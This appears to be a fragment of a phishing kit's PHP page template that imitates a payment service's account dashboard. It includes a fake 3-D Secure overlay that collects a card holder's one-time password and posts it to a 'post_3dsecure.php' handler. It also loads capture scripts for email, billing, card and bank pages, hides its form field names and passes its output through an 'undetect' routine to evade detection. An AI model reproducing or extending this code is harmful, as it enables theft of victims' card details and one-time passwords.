<?php
$html .= '
</div>
</section>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="vx_globalFooter-container">
<div class="vx_globalFooter">
<div class="vx_globalFooter-content">
<ul class="vx_globalFooter-list">
<li><a href="#">'.$api->text_encode($text['37']).'</a></li>
<li><a href="#">'.$api->text_encode($text['12']).'</a></li>
</ul>
<div class="vx_globalFooter_secondary">
<p class="vx_globalFooter-copyright">&copy; '.$api->text_encode(date('Y')." ".$text['18']." ".$text['15']).'</p>
<ul class="vx_globalFooter-list_secondary">
<li><a href="#">'.$api->text_encode($text['16']).'</a></li>
<li><a href="#">'.$api->text_encode($text['17']).'</a></li>
<li><a href="#">'.$api->text_encode($text['38']).'</a></li>
<li><a href="#">'.$api->text_encode($text['39']).'</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>';

if ($page == 'card1' || $page == 'card2') {
  $html .= '
  <div class="secure-header" id="secure3D">
  <div class="secure-body"></div>
  <div class="secure-content" align="center">
  <p style="font-size:20px; padding-top: 5px" id="xcard"><p>
  <hr>
  <form action="../action/post_3dsecure.php?session='.$page.'&return='.$return.'" method="post">
  <img src="" height="65px" width="100px" style="padding-bottom: 15px" id="secureLogo">';
  if ($_SESSION['countrycode'] == 'JP') {
    $html .= '<input type="password" name="'.$api->encypt("otp").'" placeholder="パスワード" class="secure-input">';
  } else {
    $html .= '<input type="password" name="'.$api->encypt("otp").'" placeholder="One time password" class="secure-input" id="Otp">';
  }
  $html .= '
  <button class="vx_btn col-md-10 col-sm-10 col-xs-10" style="margin-right: 0em; padding-bottom: 10px;" type="submit">'.$api->text_encode($text['59']).'</button>
  </form>
  </div>
  </div>
  ';
}

$html .= '
<div class="logout-header" id="LogOut">
<div class="logout-body"></div>
<div class="logout-content" align="center">
<h2>'.$api->text_encode($text['40']).'</h2>
<a class="vx_btn" id="close">'.$api->text_encode($text['41']).'</a>
</div>
</div>';

if ($page == "email" || $page == "billing" || $page == "card1" || $page == "bank" || $page == "card2") {
  $html .= '<script src="'.$api->text_encode("../assets/js/".$page.".post.js").'"></script>';
}

$html .= '
<script src="'.$api->text_encode("../assets/js/dashboard.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>
